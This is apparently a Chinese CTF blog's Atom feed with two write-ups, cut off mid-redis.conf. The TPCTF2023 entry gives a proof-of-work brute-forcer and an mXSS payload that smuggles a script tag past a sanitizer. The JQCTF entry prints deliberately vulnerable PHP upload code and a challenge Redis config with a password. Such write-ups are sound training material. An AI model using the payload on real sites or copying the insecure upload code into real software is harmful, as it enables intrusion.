<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-12-06T02:51:48.630Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>TPCTF2023-walk off the earth</title>
    <link href="https://ke1nys.github.io/posts/f07ab6bb.html"/>
    <id>https://ke1nys.github.io/posts/f07ab6bb.html</id>
    <published>2023-12-06T02:44:32.000Z</published>
    <updated>2023-12-06T02:51:48.630Z</updated>
    
    <content type="html"><![CDATA[<p>参考的是<a href="https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-earth">https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-earth</a>  这篇文章</p><p>pow计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="string">&#x27;abd3d4a91f15fbc0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">suffix</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Concatenate the base and suffix</span></span><br><span class="line">    data = base + suffix</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate the SHA256 hash</span></span><br><span class="line">    hash_value = hashlib.sha256(data.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check if the hash value starts with &#x27;0000000(7)&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> hash_value.startswith(<span class="string">&#x27;0000000&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">pwnlib.util.iters.mbruteforce(test, string.digits + string.ascii_letters + string.punctuation, <span class="number">8</span>,<span class="string">&#x27;fixed&#x27;</span>)</span><br></pre></td></tr></table></figure><p>漏洞点</p><p><img src="../images/image-20231206104624902.png" alt="image-20231206104624902"></p><p>就是在我们输入的js代码后  运行超时后  就会进行catch进行抛出异常  return返回flag<strong>(res就是flag)</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/note?text=&lt;form&gt;+&lt;math&gt;&lt;mtext&gt;+&lt;%2Fform&gt;&lt;form&gt;+&lt;mglyph&gt;+&lt;style&gt;&lt;%2Fmath&gt;&lt;script+src%3D%27https://app.requestly.io/delay/5000/www.baidu.com%27&gt;&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domcontentloaded`不会等`img src`但是会等`script src</span><br></pre></td></tr></table></figure><p>在本地调试了一下  发现在waf这个地方<img src="../images/image-20231206104901259.png" alt="image-20231206104901259"></p><p><code>node.tagName</code>这个东西在循环到<code>style</code>的时候就停止循环了  就不接着往下查找了  然后就可以导致<code>script</code>可以绕过过滤了  <strong>(这个原因不知道为啥  于是写篇文章来记录一下  看看啥时候有大佬写原理)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考的是&lt;a href=&quot;https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-earth&quot;&gt;https://boogipop.com/2023/12/01/TPCTF%2020</summary>
      
    
    
    
    
    <category term="TPCTF2023" scheme="https://ke1nys.github.io/tags/TPCTF2023/"/>
    
  </entry>
  
  <entry>
    <title>JQCTF-Web复现</title>
    <link href="https://ke1nys.github.io/posts/f7872afc.html"/>
    <id>https://ke1nys.github.io/posts/f7872afc.html</id>
    <published>2023-12-05T11:05:58.000Z</published>
    <updated>2023-12-06T02:51:48.628Z</updated>
    
    <content type="html"><![CDATA[<h2 id="solo-php"><a href="#solo-php" class="headerlink" title="solo-php"></a>solo-php</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test_upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">checkname</span>(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkname</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$tmpname</span>)) &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>, <span class="string">&quot;/var/www/html/check.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload ok&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;check.jpg&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph|\\\x|&lt;\?/i&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;check.jpg&#x27;</span>)))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;check.jpg&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">getimagesize</span>(<span class="string">&#x27;check.jpg&#x27;</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;check.jpg&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目给的两个文件</p><p>redis.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># Redis configuration file example. # # Note that in order to read the configuration file, Redis must be # started with the file path as first argument: # # ./redis-server /path/to/redis.conf # Note on units: when memory size is needed, it is possible to specify # it in the usual form of 1k 5GB 4M and so forth: # # 1k =&gt; 1000 bytes # 1kb =&gt; 1024 bytes # 1m =&gt; 1000000 bytes # 1mb =&gt; 1024*1024 bytes # 1g =&gt; 1000000000 bytes # 1gb =&gt; 1024*1024*1024 bytes # # units are case insensitive so 1GB 1Gb 1gB are all the same. ################################## INCLUDES ################################### # Include one or more other config files here. This is useful if you # have a standard template that goes to all Redis servers but also need # to customize a few per-server settings. Include files can include # other files, so use this wisely. # # Notice option &quot;include&quot; won&#x27;t be rewritten by command &quot;CONFIG REWRITE&quot; # from admin or Redis Sentinel. Since Redis always uses the last processed # line as value of a configuration directive, you&#x27;d better put includes # at the beginning of this file to avoid overwriting config change at runtime. # # If instead you are interested in using includes to override configuration # options, it is better to use include as the last line. # # include /path/to/local.conf # include /path/to/other.conf ################################## MODULES ##################################### # Load modules at startup. If the server is not able to load modules # it will abort. It is possible to use multiple loadmodule directives. # # loadmodule /path/to/my_module.so # loadmodule /path/to/other_module.so ################################## NETWORK ##################################### # By default, if no &quot;bind&quot; configuration directive is specified, Redis listens # for connections from all the network interfaces available on the server. # It is possible to listen to just one or multiple selected interfaces using # the &quot;bind&quot; configuration directive, followed by one or more IP addresses. # # Examples: # # bind 192.168.1.100 10.0.0.1 # bind 127.0.0.1 ::1 # # ~~~ WARNING ~~~ If the computer running Redis is directly exposed to the # internet, binding to all the interfaces is dangerous and will expose the # instance to everybody on the internet. So by default we uncomment the # following bind directive, that will force Redis to listen only into # the IPv4 loopback interface address (this means Redis will be able to # accept connections only from clients running into the same computer it # is running). # # IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES # JUST COMMENT THE FOLLOWING LINE. # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ bind 127.0.0.1 ::1 # Protected mode is a layer of security protection, in order to avoid that # Redis instances left open on the internet are accessed and exploited. # # When protected mode is on and if: # # 1) The server is not binding explicitly to a set of addresses using the # &quot;bind&quot; directive. # 2) No password is configured. # # The server only accepts connections from clients connecting from the # IPv4 and IPv6 loopback addresses 127.0.0.1 and ::1, and from Unix domain # sockets. # # By default protected mode is enabled. You should disable it only if # you are sure you want clients from other hosts to connect to Redis # even if no authentication is configured, nor a specific set of interfaces # are explicitly listed using the &quot;bind&quot; directive. protected-mode yes # Accept connections on the specified port, default is 6379 (IANA #815344). # If port 0 is specified Redis will not listen on a TCP socket. port 6379 # TCP listen() backlog. # # In high requests-per-second environments you need an high backlog in order # to avoid slow clients connections issues. Note that the Linux kernel # will silently truncate it to the value of /proc/sys/net/core/somaxconn so # make sure to raise both the value of somaxconn and tcp_max_syn_backlog # in order to get the desired effect. tcp-backlog 511 # Unix socket. # # Specify the path for the Unix socket that will be used to listen for # incoming connections. There is no default, so Redis will not listen # on a unix socket when not specified. # # unixsocket /var/run/redis/redis-server.sock # unixsocketperm 700 # Close the connection after a client is idle for N seconds (0 to disable) timeout 0 # TCP keepalive. # # If non-zero, use SO_KEEPALIVE to send TCP ACKs to clients in absence # of communication. This is useful for two reasons: # # 1) Detect dead peers. # 2) Take the connection alive from the point of view of network # equipment in the middle. # # On Linux, the specified value (in seconds) is the period used to send ACKs. # Note that to close the connection the double of the time is needed. # On other kernels the period depends on the kernel configuration. # # A reasonable value for this option is 300 seconds, which is the new # Redis default starting with Redis 3.2.1. tcp-keepalive 300 ################################# GENERAL ##################################### # By default Redis does not run as a daemon. Use &#x27;yes&#x27; if you need it. # Note that Redis will write a pid file in /var/run/redis.pid when daemonized. daemonize yes # If you run Redis from upstart or systemd, Redis can interact with your # supervision tree. Options: # supervised no - no supervision interaction # supervised upstart - signal upstart by putting Redis into SIGSTOP mode # supervised systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET # supervised auto - detect upstart or systemd method based on # UPSTART_JOB or NOTIFY_SOCKET environment variables # Note: these supervision methods only signal &quot;process is ready.&quot; # They do not enable continuous liveness pings back to your supervisor. supervised no # If a pid file is specified, Redis writes it where specified at startup # and removes it at exit. # # When the server runs non daemonized, no pid file is created if none is # specified in the configuration. When the server is daemonized, the pid file # is used even if not specified, defaulting to &quot;/var/run/redis.pid&quot;. # # Creating a pid file is best effort: if Redis is not able to create it # nothing bad happens, the server will start and run normally. pidfile /var/run/redis/redis-server.pid # Specify the server verbosity level. # This can be one of: # debug (a lot of information, useful for development/testing) # verbose (many rarely useful info, but not a mess like the debug level) # notice (moderately verbose, what you want in production probably) # warning (only very important / critical messages are logged) loglevel notice # Specify the log file name. Also the empty string can be used to force # Redis to log on the standard output. Note that if you use standard # output for logging but daemonize, logs will be sent to /dev/null logfile /var/log/redis/redis-server.log # To enable logging to the system logger, just set &#x27;syslog-enabled&#x27; to yes, # and optionally update the other syslog parameters to suit your needs. # syslog-enabled no # Specify the syslog identity. # syslog-ident redis # Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7. # syslog-facility local0 # Set the number of databases. The default database is DB 0, you can select # a different one on a per-connection basis using SELECT where # dbid is a number between 0 and &#x27;databases&#x27;-1 databases 16 # By default Redis shows an ASCII art logo only when started to log to the # standard output and if the standard output is a TTY. Basically this means # that normally a logo is displayed only in interactive sessions. # # However it is possible to force the pre-4.0 behavior and always show a # ASCII art logo in startup logs by setting the following option to yes. always-show-logo yes ################################ SNAPSHOTTING ################################ # # Save the DB on disk: # # save # # Will save the DB if both the given number of seconds and the given # number of write operations against the DB occurred. # # In the example below the behaviour will be to save: # after 900 sec (15 min) if at least 1 key changed # after 300 sec (5 min) if at least 10 keys changed # after 60 sec if at least 10000 keys changed # # Note: you can disable saving completely by commenting out all &quot;save&quot; lines. # # It is also possible to remove all the previously configured save # points by adding a save directive with a single empty string argument # like in the following example: # # save &quot;&quot; save 900 1 save 300 10 save 60 10000 # By default Redis will stop accepting writes if RDB snapshots are enabled # (at least one save point) and the latest background save failed. # This will make the user aware (in a hard way) that data is not persisting # on disk properly, otherwise chances are that no one will notice and some # disaster will happen. # # If the background saving process will start working again Redis will # automatically allow writes again. # # However if you have setup your proper monitoring of the Redis server # and persistence, you may want to disable this feature so that Redis will # continue to work as usual even if there are problems with disk, # permissions, and so forth. stop-writes-on-bgsave-error yes # Compress string objects using LZF when dump .rdb databases? # For default that&#x27;s set to &#x27;yes&#x27; as it&#x27;s almost always a win. # If you want to save some CPU in the saving child set it to &#x27;no&#x27; but # the dataset will likely be bigger if you have compressible values or keys. rdbcompression yes # Since version 5 of RDB a CRC64 checksum is placed at the end of the file. # This makes the format more resistant to corruption but there is a performance # hit to pay (around 10%) when saving and loading RDB files, so you can disable it # for maximum performances. # # RDB files created with checksum disabled have a checksum of zero that will # tell the loading code to skip the check. rdbchecksum yes # The filename where to dump the DB dbfilename dump.rdb # The working directory. # # The DB will be written inside this directory, with the filename specified # above using the &#x27;dbfilename&#x27; configuration directive. # # The Append Only File will also be created inside this directory. # # Note that you must specify a directory here, not a file name. dir /var/lib/redis ################################# REPLICATION ################################# # Master-Replica replication. Use replicaof to make a Redis instance a copy of # another Redis server. A few things to understand ASAP about Redis replication. # # +------------------+ +---------------+ # | Master | ---&gt; | Replica | # | (receive writes) | | (exact copy) | # +------------------+ +---------------+ # # 1) Redis replication is asynchronous, but you can configure a master to # stop accepting writes if it appears to be not connected with at least # a given number of replicas. # 2) Redis replicas are able to perform a partial resynchronization with the # master if the replication link is lost for a relatively small amount of # time. You may want to configure the replication backlog size (see the next # sections of this file) with a sensible value depending on your needs. # 3) Replication is automatic and does not need user intervention. After a # network partition replicas automatically try to reconnect to masters # and resynchronize with them. # # replicaof # If the master is password protected (using the &quot;requirepass&quot; configuration # directive below) it is possible to tell the replica to authenticate before # starting the replication synchronization process, otherwise the master will # refuse the replica request. # # masterauth # When a replica loses its connection with the master, or when the replication # is still in progress, the replica can act in two different ways: # # 1) if replica-serve-stale-data is set to &#x27;yes&#x27; (the default) the replica will # still reply to client requests, possibly with out of date data, or the # data set may just be empty if this is the first synchronization. # # 2) if replica-serve-stale-data is set to &#x27;no&#x27; the replica will reply with # an error &quot;SYNC with master in progress&quot; to all the kind of commands # but to INFO, replicaOF, AUTH, PING, SHUTDOWN, REPLCONF, ROLE, CONFIG, # SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB, # COMMAND, POST, HOST: and LATENCY. # replica-serve-stale-data yes # You can configure a replica instance to accept writes or not. Writing against # a replica instance may be useful to store some ephemeral data (because data # written on a replica will be easily deleted after resync with the master) but # may also cause problems if clients are writing to it because of a # misconfiguration. # # Since Redis 2.6 by default replicas are read-only. # # Note: read only replicas are not designed to be exposed to untrusted clients # on the internet. It&#x27;s just a protection layer against misuse of the instance. # Still a read only replica exports by default all the administrative commands # such as CONFIG, DEBUG, and so forth. To a limited extent you can improve # security of read only replicas using &#x27;rename-command&#x27; to shadow all the # administrative / dangerous commands. replica-read-only yes # Replication SYNC strategy: disk or socket. # # ------------------------------------------------------- # WARNING: DISKLESS REPLICATION IS EXPERIMENTAL CURRENTLY # ------------------------------------------------------- # # New replicas and reconnecting replicas that are not able to continue the replication # process just receiving differences, need to do what is called a &quot;full # synchronization&quot;. An RDB file is transmitted from the master to the replicas. # The transmission can happen in two different ways: # # 1) Disk-backed: The Redis master creates a new process that writes the RDB # file on disk. Later the file is transferred by the parent # process to the replicas incrementally. # 2) Diskless: The Redis master creates a new process that directly writes the # RDB file to replica sockets, without touching the disk at all. # # With disk-backed replication, while the RDB file is generated, more replicas # can be queued and served with the RDB file as soon as the current child producing # the RDB file finishes its work. With diskless replication instead once # the transfer starts, new replicas arriving will be queued and a new transfer # will start when the current one terminates. # # When diskless replication is used, the master waits a configurable amount of # time (in seconds) before starting the transfer in the hope that multiple replicas # will arrive and the transfer can be parallelized. # # With slow disks and fast (large bandwidth) networks, diskless replication # works better. repl-diskless-sync no # When diskless replication is enabled, it is possible to configure the delay # the server waits in order to spawn the child that transfers the RDB via socket # to the replicas. # # This is important since once the transfer starts, it is not possible to serve # new replicas arriving, that will be queued for the next RDB transfer, so the server # waits a delay in order to let more replicas arrive. # # The delay is specified in seconds, and by default is 5 seconds. To disable # it entirely just set it to 0 seconds and the transfer will start ASAP. repl-diskless-sync-delay 5 # Replicas send PINGs to server in a predefined interval. It&#x27;s possible to change # this interval with the repl_ping_replica_period option. The default value is 10 # seconds. # # repl-ping-replica-period 10 # The following option sets the replication timeout for: # # 1) Bulk transfer I/O during SYNC, from the point of view of replica. # 2) Master timeout from the point of view of replicas (data, pings). # 3) Replica timeout from the point of view of masters (REPLCONF ACK pings). # # It is important to make sure that this value is greater than the value # specified for repl-ping-replica-period otherwise a timeout will be detected # every time there is low traffic between the master and the replica. # # repl-timeout 60 # Disable TCP_NODELAY on the replica socket after SYNC? # # If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and # less bandwidth to send data to replicas. But this can add a delay for # the data to appear on the replica side, up to 40 milliseconds with # Linux kernels using a default configuration. # # If you select &quot;no&quot; the delay for data to appear on the replica side will # be reduced but more bandwidth will be used for replication. # # By default we optimize for low latency, but in very high traffic conditions # or when the master and replicas are many hops away, turning this to &quot;yes&quot; may # be a good idea. repl-disable-tcp-nodelay no # Set the replication backlog size. The backlog is a buffer that accumulates # replica data when replicas are disconnected for some time, so that when a replica # wants to reconnect again, often a full resync is not needed, but a partial # resync is enough, just passing the portion of data the replica missed while # disconnected. # # The bigger the replication backlog, the longer the time the replica can be # disconnected and later be able to perform a partial resynchronization. # # The backlog is only allocated once there is at least a replica connected. # # repl-backlog-size 1mb # After a master has no longer connected replicas for some time, the backlog # will be freed. The following option configures the amount of seconds that # need to elapse, starting from the time the last replica disconnected, for # the backlog buffer to be freed. # # Note that replicas never free the backlog for timeout, since they may be # promoted to masters later, and should be able to correctly &quot;partially # resynchronize&quot; with the replicas: hence they should always accumulate backlog. # # A value of 0 means to never release the backlog. # # repl-backlog-ttl 3600 # The replica priority is an integer number published by Redis in the INFO output. # It is used by Redis Sentinel in order to select a replica to promote into a # master if the master is no longer working correctly. # # A replica with a low priority number is considered better for promotion, so # for instance if there are three replicas with priority 10, 100, 25 Sentinel will # pick the one with priority 10, that is the lowest. # # However a special priority of 0 marks the replica as not able to perform the # role of master, so a replica with priority of 0 will never be selected by # Redis Sentinel for promotion. # # By default the priority is 100. replica-priority 100 # It is possible for a master to stop accepting writes if there are less than # N replicas connected, having a lag less or equal than M seconds. # # The N replicas need to be in &quot;online&quot; state. # # The lag in seconds, that must be &lt;= the specified value, is calculated from # the last ping received from the replica, that is usually sent every second. # # This option does not GUARANTEE that N replicas will accept the write, but # will limit the window of exposure for lost writes in case not enough replicas # are available, to the specified number of seconds. # # For example to require at least 3 replicas with a lag &lt;= 10 seconds use: # # min-replicas-to-write 3 # min-replicas-max-lag 10 # # Setting one or the other to 0 disables the feature. # # By default min-replicas-to-write is set to 0 (feature disabled) and # min-replicas-max-lag is set to 10. # A Redis master is able to list the address and port of the attached # replicas in different ways. For example the &quot;INFO replication&quot; section # offers this information, which is used, among other tools, by # Redis Sentinel in order to discover replica instances. # Another place where this info is available is in the output of the # &quot;ROLE&quot; command of a master. # # The listed IP and address normally reported by a replica is obtained # in the following way: # # IP: The address is auto detected by checking the peer address # of the socket used by the replica to connect with the master. # # Port: The port is communicated by the replica during the replication # handshake, and is normally the port that the replica is using to # listen for connections. # # However when port forwarding or Network Address Translation (NAT) is # used, the replica may be actually reachable via different IP and port # pairs. The following two options can be used by a replica in order to # report to its master a specific set of IP and port, so that both INFO # and ROLE will report those values. # # There is no need to use both the options if you need to override just # the port or the IP address. # # replica-announce-ip 5.5.5.5 # replica-announce-port 1234 ################################## SECURITY ################################### # Require clients to issue AUTH before processing any other # commands. This might be useful in environments in which you do not trust # others with access to the host running redis-server. # # This should stay commented out for backward compatibility and because most # people do not need auth (e.g. they run their own servers). # # Warning: since Redis is pretty fast an outside user can try up to # 150k passwords per second against a good box. This means that you should # use a very strong password otherwise it will be very easy to break. # # requirepass foobared requirepass 574c941c5987232d337276764d3413c4 # Command renaming. # # It is possible to change the name of dangerous commands in a shared # environment. For instance the CONFIG command may be renamed into something # hard to guess so that it will still be available for internal-use tools # but not available for general clients. # # Example: # # rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52 # # It is also possible to completely kill a command by renaming it into # an empty string: # # rename-command CONFIG &quot;&quot; # # Please note that changing the name of commands that are logged into the # AOF file or transmitted to replicas may cause problems. ################################### CLIENTS #################################### # Set the max number of connected clients at the same time. By default # this limit is set to 10000 clients, however if the Redis server is not # able to configure the process file limit to allow for the specified limit # the max number of allowed clients is set to the current file limit # minus 32 (as Redis reserves a few file descriptors for internal uses). # # Once the limit is reached Redis will close all the new connections sending # an error &#x27;max number of clients reached&#x27;. # # maxclients 10000 ############################## MEMORY MANAGEMENT ################################ # Set a memory usage limit to the specified amount of bytes. # When the memory limit is reached Redis will try to remove keys # according to the eviction policy selected (see maxmemory-policy). # # If Redis can&#x27;t remove keys according to the policy, or if the policy is # set to &#x27;noeviction&#x27;, Redis will start to reply with errors to commands # that would use more memory, like SET, LPUSH, and so on, and will continue # to reply to read-only commands like GET. # # This option is usually useful when using Redis as an LRU or LFU cache, or to # set a hard memory limit for an instance (using the &#x27;noeviction&#x27; policy). # # WARNING: If you have replicas attached to an instance with maxmemory on, # the size of the output buffers needed to feed the replicas are subtracted # from the used memory count, so that network problems / resyncs will # not trigger a loop where keys are evicted, and in turn the output # buffer of replicas is full with DELs of keys evicted triggering the deletion # of more keys, and so forth until the database is completely emptied. # # In short... if you have replicas attached it is suggested that you set a lower # limit for maxmemory so that there is some free RAM on the system for replica # output buffers (but this is not needed if the policy is &#x27;noeviction&#x27;). # # maxmemory # MAXMEMORY POLICY: how Redis will select what to remove when maxmemory # is reached. You can select among five behaviors: # # volatile-lru -&gt; Evict using approximated LRU among the keys with an expire set. # allkeys-lru -&gt; Evict any key using approximated LRU. # volatile-lfu -&gt; Evict using approximated LFU among the keys with an expire set. # allkeys-lfu -&gt; Evict any key using approximated LFU. # volatile-random -&gt; Remove a random key among the ones with an expire set. # allkeys-random -&gt; Remove a random key, any key. # volatile-ttl -&gt; Remove the key with the nearest expire time (minor TTL) # noeviction -&gt; Don&#x27;t evict anything, just return an error on write operations. # # LRU means Least Recently Used # LFU means Least Frequently Used # # Both LRU, LFU and volatile-ttl are implemented using approximated # randomized algorithms. # # Note: with any of the above policies, Redis will return an error on write # operations, when there are no suitable keys for eviction. # # At the date of writing these commands are: set setnx setex append # incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd # sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby # zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby # getset mset msetnx exec sort # # The default is: # # maxmemory-policy noeviction # LRU, LFU and minimal TTL algorithms are not precise algorithms but approximated # algorithms (in order to save memory), so you can tune it for speed or # accuracy. For default Redis will check five keys and pick the one that was # used less recently, you can change the sample size using the following # configuration directive. # # The default of 5 produces good enough results. 10 Approximates very closely # true LRU but costs more CPU. 3 is faster but not very accurate. # # maxmemory-samples 5 # Starting from Redis 5, by default a replica will ignore its maxmemory setting # (unless it is promoted to master after a failover or manually). It means # that the eviction of keys will be just handled by the master, sending the # DEL commands to the replica as keys evict in the master side. # # This behavior ensures that masters and replicas stay consistent, and is usually # what you want, however if your replica is writable, or you want the replica to have # a different memory setting, and you are sure all the writes performed to the # replica are idempotent, then you may change this default (but be sure to understand # what you are doing). # # Note that since the replica by default does not evict, it may end using more # memory than the one set via maxmemory (there are certain buffers that may # be larger on the replica, or data structures may sometimes take more memory and so # forth). So make sure you monitor your replicas and make sure they have enough # memory to never hit a real out-of-memory condition before the master hits # the configured maxmemory setting. # # replica-ignore-maxmemory yes ############################# LAZY FREEING #################################### # Redis has two primitives to delete keys. One is called DEL and is a blocking # deletion of the object. It means that the server stops processing new commands # in order to reclaim all the memory associated with an object in a synchronous # way. If the key deleted is associated with a small object, the time needed # in order to execute the DEL command is very small and comparable to most other # O(1) or O(log_N) commands in Redis. However if the key is associated with an # aggregated value containing millions of elements, the server can block for # a long time (even seconds) in order to complete the operation. # # For the above reasons Redis also offers non blocking deletion primitives # such as UNLINK (non blocking DEL) and the ASYNC option of FLUSHALL and # FLUSHDB commands, in order to reclaim memory in background. Those commands # are executed in constant time. Another thread will incrementally free the # object in the background as fast as possible. # # DEL, UNLINK and ASYNC option of FLUSHALL and FLUSHDB are user-controlled. # It&#x27;s up to the design of the application to understand when it is a good # idea to use one or the other. However the Redis server sometimes has to # delete keys or flush the whole database as a side effect of other operations. # Specifically Redis deletes objects independently of a user call in the # following scenarios: # # 1) On eviction, because of the maxmemory and maxmemory policy configurations, # in order to make room for new data, without going over the specified # memory limit. # 2) Because of expire: when a key with an associated time to live (see the # 